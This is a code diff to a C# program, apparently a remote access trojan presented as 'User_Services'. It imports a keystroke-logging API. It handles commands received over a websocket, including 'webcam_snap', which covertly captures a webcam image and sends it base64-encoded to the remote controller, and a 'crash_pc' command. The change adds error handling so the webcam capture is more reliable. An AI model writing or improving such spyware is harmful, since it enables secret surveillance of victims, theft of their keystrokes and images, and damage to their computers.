@@ -9,6 +9,7 @@ using System.Windows.Forms;
 using Emgu.CV;
 using Keystroke.API;
 using System.Runtime.InteropServices;
+using DirectShowLib;
 
 namespace User_Services
 {
@@ -166,13 +167,20 @@ namespace User_Services
                     }
                     else if (message == "webcam_snap")
                     {
-                        VideoCapture capture = new VideoCapture();
-                        Bitmap image = capture.QueryFrame().Bitmap;
-                        MemoryStream ms = new MemoryStream();
-                        image.Save(ms, ImageFormat.Jpeg);
-                        byte[] byteImage = ms.ToArray();
-                        var SigBase64 = Convert.ToBase64String(byteImage);
-                        ws.Send("##WEBCAM_SNAP##" + SigBase64);
+                        try
+                        {
+                            VideoCapture capture = new VideoCapture();
+                            Bitmap image = capture.QueryFrame().Bitmap;
+                            MemoryStream ms = new MemoryStream();
+                            image.Save(ms, ImageFormat.Jpeg);
+                            byte[] byteImage = ms.ToArray();
+                            var SigBase64 = Convert.ToBase64String(byteImage);
+                            ws.Send("##WEBCAM_SNAP##" + SigBase64);
+
+                        }catch(Exception error)
+                        {
+                            ws.Send("##ERROR##" + error.ToString().Replace("\"", ""));
+                        }
                         ws.Send("hello ##" + Environment.CurrentDirectory + "##");
                     }
                     else if (message.StartsWith("crash_pc"))
